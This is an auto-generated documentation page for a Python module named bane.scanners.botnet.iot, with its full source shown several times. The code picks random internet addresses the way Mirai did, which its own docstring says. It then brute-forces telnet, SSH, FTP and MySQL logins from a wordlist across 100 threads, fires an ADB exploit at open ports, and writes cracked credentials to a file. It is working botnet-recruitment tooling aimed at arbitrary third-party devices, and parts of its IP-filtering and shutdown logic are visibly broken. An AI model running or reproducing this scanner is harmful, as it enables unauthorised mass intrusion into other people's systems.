<body>
<main>
<article id="content">
<header>
<h1 class="title">Module <code>bane.scanners.botnet.iot</code></h1>
</header>
<section id="section-intro">
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">import os, sys, socket, random, time, threading, xtelnet
from bane.common.payloads import *
from bane.scanners.vulnerabilities.vulns import adb_exploit, exposed_telnet
from ftplib import FTP

from bane.bruteforce.hydra import *
from bane.utils.handle_files import write_file


def getip():
    &#34;&#34;&#34;
    this function was inspired by the scanning file in mirai&#39;s source code to returns a safe IP to bruteforce.&#34;&#34;&#34;
    d = [3, 6, 7, 10, 11, 15, 16, 21, 22, 23, 26, 28, 29, 30, 33, 55, 56, 127, 214, 215]
    f = [100, 169, 172, 198]
    while True:
        o1 = random.randint(1, 253)
        o2 = random.randint(0, 254)
        if o1 not in d:
            if o1 in f:
                if (o1 == 192) and (o2 != 168):
                    return &#34;{}.{}.{}.{}&#34;.format(
                        o1, o2, random.randint(0, 255), random.randint(0, 255)
                    )
                if (o1 == 172) and ((o2 &lt;= 16) and (o2 &gt;= 32)):
                    return &#34;{}.{}.{}.{}&#34;.format(
                        o1, o2, random.randint(0, 255), random.randint(0, 255)
                    )
                if (o1 == 100) and (o2 != 64):
                    return &#34;{}.{}.{}.{}&#34;.format(
                        o1, o2, random.randint(0, 255), random.randint(0, 255)
                    )
                if (o1 == 169) and (o2 != 254):
                    return &#34;{}.{}.{}.{}&#34;.format(
                        o1, o2, random.randint(0, 255), random.randint(0, 255)
                    )
                if (o1 == 198) and (o2 != 18):
                    return &#34;{}.{}.{}.{}&#34;.format(
                        o1, o2, random.randint(0, 255), random.randint(0, 255)
                    )
            else:
                return &#34;{}.{}.{}.{}&#34;.format(
                    o1, o2, random.randint(0, 255), random.randint(0, 255)
                )


&#34;&#34;&#34;
  the following functions are used to scan safe IPs all over the internet with a word_list, it can scan bruteforce their: ftp, ssh, telnet, smtp and mysql logins then save them on text files in the same directory.
  it&#39;s highly recommended to be used with a VPS or your slow internet speed will be an obstacle to your scan.
&#34;&#34;&#34;


class mass_scan:
    def __init__(
        self,
        file_name=&#34;results.csv&#34;,
        protocol=&#34;telnet&#34;,
        telnet_bots=True,
        threads_daemon=True,
        logs=True,
        threads=100,
        word_list=[],
        ip_range=None,
        timeout=7,
        p=23,
    ):
        self.word_list = word_list
        self.logs = logs
        self.protocol = protocol.lower()
        self.stop = False
        self.ip_range = ip_range
        self.timeout = timeout
        self.port = p
        self.result = []
        self.telnet_bots = telnet_bots
        self.file_name = file_name
        if os.path.exists(self.file_name) == False:
            write_file(&#34;protocol,ip,port,username,password&#34;, self.file_name)
        for x in range(threads):
            t = threading.Thread(target=self.scan)
            t.daemon = threads_daemon
            t.start()

    def scan(self):
        try:
            time.sleep(1)
            while True:
                try:
                    if self.stop == True:
                        break
                    if self.ip_range == None:
                        ip = getip()
                    else:
                        ip = self.ip_range.format(
                            random.randint(0, 255),
                            random.randint(0, 255),
                            random.randint(0, 255),
                            random.randint(0, 255),
                        )
                    i = False
                    try:
                        so = socket.socket()
                        so.settimeout(self.timeout)
                        so.connect((ip, self.port))
                        i = True
                        so.close()
                    except:
                        pass
                    if self.stop == True:
                        break
                    if i == True:
                        if self.protocol == &#34;adb&#34;:
                            q = adb_exploit(ip, timeout=self.timeout, p=self.port)
                            if q == True:
                                res = &#34;adb:{}:{}::&#34;.format(ip, self.port)
                                write_file(res, self.file_name)
                                self.result.append(res)
                                if self.logs == True:
                                    print(res)
                        else:
                            if self.protocol == &#34;ssh&#34;:
                                func = ssh
                            elif self.protocol == &#34;telnet&#34;:
                                func = telnet
                            elif self.protocol == &#34;ftp&#34;:
                                func = ftp
                            elif self.protocol == &#34;mysql&#34;:
                                func = mysql
                            for x in self.word_list:
                                if self.stop == True:
                                    break
                                try:
                                    username = x.split(&#34;:&#34;)[0]
                                    password = x.split(&#34;:&#34;)[1]
                                    if (
                                        self.protocol == &#34;telnet&#34;
                                        and self.telnet_bots == True
                                    ):
                                        q = func(
                                            ip,
                                            username,
                                            password,
                                            timeout=self.timeout,
                                            p=self.port,
                                            bot_mode=True,
                                        )
                                    else:
                                        q = func(
                                            ip,
                                            username,
                                            password,
                                            timeout=self.timeout,
                                            p=self.port,
                                        )
                                    if q == True:
                                        res = &#34;{},{},{},{},{}&#34;.format(
                                            self.protocol,
                                            ip,
                                            self.port,
                                            username,
                                            password,
                                        )
                                        write_file(res, self.file_name)
                                        self.result.append(res)
                                        if self.logs == True:
                                            print(res)
                                        break
                                except:
                                    pass
                except:
                    pass
            self.kill()
        except:
            pass

    def done(self):
        if &#34;stop&#34; in dir(self):
            return False
        return True

    def reset(self):
        l = []
        for x in self.__dict__:
            self.__dict__[x] = None
            l.append(x)
        for x in l:
            delattr(self, x)

    def kill(self):
        self.stop = True
        a = self.__dict__[&#34;found&#34;]
        self.reset()  # this will kill any running threads instantly by setting all the attacking information to &#34;None&#34; and cause error which is handled with the &#34;try...except...&#34; around the main while loop
        return a</code></pre>
</details>
</section>
<section>
</section>
<section>
</section>
<section>
<h2 class="section-title" id="header-functions">Functions</h2>
<dl>
<dt id="bane.scanners.botnet.iot.getip"><code class="name flex">
<span>def <span class="ident">getip</span></span>(<span>)</span>
</code></dt>
<dd>
<div class="desc"><p>this function was inspired by the scanning file in mirai's source code to returns a safe IP to bruteforce.</p></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def getip():
    &#34;&#34;&#34;
    this function was inspired by the scanning file in mirai&#39;s source code to returns a safe IP to bruteforce.&#34;&#34;&#34;
    d = [3, 6, 7, 10, 11, 15, 16, 21, 22, 23, 26, 28, 29, 30, 33, 55, 56, 127, 214, 215]
    f = [100, 169, 172, 198]
    while True:
        o1 = random.randint(1, 253)
        o2 = random.randint(0, 254)
        if o1 not in d:
            if o1 in f:
                if (o1 == 192) and (o2 != 168):
                    return &#34;{}.{}.{}.{}&#34;.format(
                        o1, o2, random.randint(0, 255), random.randint(0, 255)
                    )
                if (o1 == 172) and ((o2 &lt;= 16) and (o2 &gt;= 32)):
                    return &#34;{}.{}.{}.{}&#34;.format(
                        o1, o2, random.randint(0, 255), random.randint(0, 255)
                    )
                if (o1 == 100) and (o2 != 64):
                    return &#34;{}.{}.{}.{}&#34;.format(
                        o1, o2, random.randint(0, 255), random.randint(0, 255)
                    )
                if (o1 == 169) and (o2 != 254):
                    return &#34;{}.{}.{}.{}&#34;.format(
                        o1, o2, random.randint(0, 255), random.randint(0, 255)
                    )
                if (o1 == 198) and (o2 != 18):
                    return &#34;{}.{}.{}.{}&#34;.format(
                        o1, o2, random.randint(0, 255), random.randint(0, 255)
                    )
            else:
                return &#34;{}.{}.{}.{}&#34;.format(
                    o1, o2, random.randint(0, 255), random.randint(0, 255)
                )</code></pre>
</details>
</dd>
</dl>
</section>
<section>
<h2 class="section-title" id="header-classes">Classes</h2>
<dl>
<dt id="bane.scanners.botnet.iot.mass_scan"><code class="flex name class">
<span>class <span class="ident">mass_scan</span></span>
<span>(</span><span>file_name='results.csv', protocol='telnet', telnet_bots=True, threads_daemon=True, logs=True, threads=100, word_list=[], ip_range=None, timeout=7, p=23)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class mass_scan:
    def __init__(
        self,
        file_name=&#34;results.csv&#34;,
        protocol=&#34;telnet&#34;,
        telnet_bots=True,
        threads_daemon=True,
        logs=True,
        threads=100,
        word_list=[],
        ip_range=None,
        timeout=7,
        p=23,
    ):
        self.word_list = word_list
        self.logs = logs
        self.protocol = protocol.lower()
        self.stop = False
        self.ip_range = ip_range
        self.timeout = timeout
        self.port = p
        self.result = []
        self.telnet_bots = telnet_bots
        self.file_name = file_name
        if os.path.exists(self.file_name) == False:
            write_file(&#34;protocol,ip,port,username,password&#34;, self.file_name)
        for x in range(threads):
            t = threading.Thread(target=self.scan)
            t.daemon = threads_daemon
            t.start()

    def scan(self):
        try:
            time.sleep(1)
            while True:
                try:
                    if self.stop == True:
                        break
                    if self.ip_range == None:
                        ip = getip()
                    else:
                        ip = self.ip_range.format(
                            random.randint(0, 255),
                            random.randint(0, 255),
                            random.randint(0, 255),
                            random.randint(0, 255),
                        )
                    i = False
                    try:
                        so = socket.socket()
                        so.settimeout(self.timeout)
                        so.connect((ip, self.port))
                        i = True
                        so.close()
                    except:
                        pass
                    if self.stop == True:
                        break
                    if i == True:
                        if self.protocol == &#34;adb&#34;:
                            q = adb_exploit(ip, timeout=self.timeout, p=self.port)
                            if q == True:
                                res = &#34;adb:{}:{}::&#34;.format(ip, self.port)
                                write_file(res, self.file_name)
                                self.result.append(res)
                                if self.logs == True:
                                    print(res)
                        else:
                            if self.protocol == &#34;ssh&#34;:
                                func = ssh
                            elif self.protocol == &#34;telnet&#34;:
                                func = telnet
                            elif self.protocol == &#34;ftp&#34;:
                                func = ftp
                            elif self.protocol == &#34;mysql&#34;:
                                func = mysql
                            for x in self.word_list:
                                if self.stop == True:
                                    break
                                try:
                                    username = x.split(&#34;:&#34;)[0]
                                    password = x.split(&#34;:&#34;)[1]
                                    if (
                                        self.protocol == &#34;telnet&#34;
                                        and self.telnet_bots == True
                                    ):
                                        q = func(
                                            ip,
                                            username,
                                            password,
                                            timeout=self.timeout,
                                            p=self.port,
                                            bot_mode=True,
                                        )
                                    else:
                                        q = func(
                                            ip,
                                            username,
                                            password,
                                            timeout=self.timeout,
                                            p=self.port,
                                        )
                                    if q == True:
                                        res = &#34;{},{},{},{},{}&#34;.format(
                                            self.protocol,
                                            ip,
                                            self.port,
                                            username,
                                            password,
                                        )
                                        write_file(res, self.file_name)
                                        self.result.append(res)
                                        if self.logs == True:
                                            print(res)
                                        break
                                except:
                                    pass
                except:
                    pass
            self.kill()
        except:
            pass

    def done(self):
        if &#34;stop&#34; in dir(self):
            return False
        return True

    def reset(self):
        l = []
        for x in self.__dict__:
            self.__dict__[x] = None
            l.append(x)
        for x in l:
            delattr(self, x)

    def kill(self):
        self.stop = True
        a = self.__dict__[&#34;found&#34;]
        self.reset()  # this will kill any running threads instantly by setting all the attacking information to &#34;None&#34; and cause error which is handled with the &#34;try...except...&#34; around the main while loop
        return a</code></pre>
</details>
<h3>Methods</h3>
<dl>
<dt id="bane.scanners.botnet.iot.mass_scan.done"><code class="name flex">
<span>def <span class="ident">done</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def done(self):
    if &#34;stop&#34; in dir(self):
        return False
    return True</code></pre>
</details>
</dd>
<dt id="bane.scanners.botnet.iot.mass_scan.kill"><code class="name flex">
<span>def <span class="ident">kill</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def kill(self):
    self.stop = True
    a = self.__dict__[&#34;found&#34;]
    self.reset()  # this will kill any running threads instantly by setting all the attacking information to &#34;None&#34; and cause error which is handled with the &#34;try...except...&#34; around the main while loop
    return a</code></pre>
</details>
</dd>
<dt id="bane.scanners.botnet.iot.mass_scan.reset"><code class="name flex">
<span>def <span class="ident">reset</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def reset(self):
    l = []
    for x in self.__dict__:
        self.__dict__[x] = None
        l.append(x)
    for x in l:
        delattr(self, x)</code></pre>
</details>
</dd>
<dt id="bane.scanners.botnet.iot.mass_scan.scan"><code class="name flex">
<span>def <span class="ident">scan</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def scan(self):
    try:
        time.sleep(1)
        while True:
            try:
                if self.stop == True:
                    break
                if self.ip_range == None:
                    ip = getip()
                else:
                    ip = self.ip_range.format(
                        random.randint(0, 255),
                        random.randint(0, 255),
                        random.randint(0, 255),
                        random.randint(0, 255),
                    )
                i = False
                try:
                    so = socket.socket()
                    so.settimeout(self.timeout)
                    so.connect((ip, self.port))
                    i = True
                    so.close()
                except:
                    pass
                if self.stop == True:
                    break
                if i == True:
                    if self.protocol == &#34;adb&#34;:
                        q = adb_exploit(ip, timeout=self.timeout, p=self.port)
                        if q == True:
                            res = &#34;adb:{}:{}::&#34;.format(ip, self.port)
                            write_file(res, self.file_name)
                            self.result.append(res)
                            if self.logs == True:
                                print(res)
                    else:
                        if self.protocol == &#34;ssh&#34;:
                            func = ssh
                        elif self.protocol == &#34;telnet&#34;:
                            func = telnet
                        elif self.protocol == &#34;ftp&#34;:
                            func = ftp
                        elif self.protocol == &#34;mysql&#34;:
                            func = mysql
                        for x in self.word_list:
                            if self.stop == True:
                                break
                            try:
                                username = x.split(&#34;:&#34;)[0]
                                password = x.split(&#34;:&#34;)[1]
                                if (
                                    self.protocol == &#34;telnet&#34;
                                    and self.telnet_bots == True
                                ):
                                    q = func(
                                        ip,
                                        username,
                                        password,
                                        timeout=self.timeout,
                                        p=self.port,
                                        bot_mode=True,
                                    )
                                else:
                                    q = func(
                                        ip,
                                        username,
                                        password,
                                        timeout=self.timeout,
                                        p=self.port,
                                    )
                                if q == True:
                                    res = &#34;{},{},{},{},{}&#34;.format(
                                        self.protocol,
                                        ip,
                                        self.port,
                                        username,
                                        password,
                                    )
                                    write_file(res, self.file_name)
                                    self.result.append(res)
                                    if self.logs == True:
                                        print(res)
                                    break
                            except:
                                pass
            except:
                pass
        self.kill()
    except:
        pass</code></pre>
</details>
</dd>
</dl>
</dd>
</dl>
</section>
</article>
<nav id="sidebar">
<h1>Index</h1>
<div class="toc">
<ul></ul>
</div>
<ul id="index">
<li><h3>Super-module</h3>
<ul>
<li><code><a title="bane.scanners.botnet" href="index.md">bane.scanners.botnet</a></code></li>
</ul>
</li>
<li><h3><a href="#header-functions">Functions</a></h3>
<ul class="">
<li><code><a title="bane.scanners.botnet.iot.getip" href="#bane.scanners.botnet.iot.getip">getip</a></code></li>
</ul>
</li>
<li><h3><a href="#header-classes">Classes</a></h3>
<ul>
<li>
<h4><code><a title="bane.scanners.botnet.iot.mass_scan" href="#bane.scanners.botnet.iot.mass_scan">mass_scan</a></code></h4>
<ul class="">
<li><code><a title="bane.scanners.botnet.iot.mass_scan.done" href="#bane.scanners.botnet.iot.mass_scan.done">done</a></code></li>
<li><code><a title="bane.scanners.botnet.iot.mass_scan.kill" href="#bane.scanners.botnet.iot.mass_scan.kill">kill</a></code></li>
<li><code><a title="bane.scanners.botnet.iot.mass_scan.reset" href="#bane.scanners.botnet.iot.mass_scan.reset">reset</a></code></li>
<li><code><a title="bane.scanners.botnet.iot.mass_scan.scan" href="#bane.scanners.botnet.iot.mass_scan.scan">scan</a></code></li>
</ul>
</li>
</ul>
</li>
</ul>
</nav>
</main>
<footer id="footer">
<p>Generated by <a href="https://pdoc3.github.io/pdoc" title="pdoc: Python API documentation generator"><cite>pdoc</cite> 0.10.0</a>.</p>
</footer>
</body>
</html>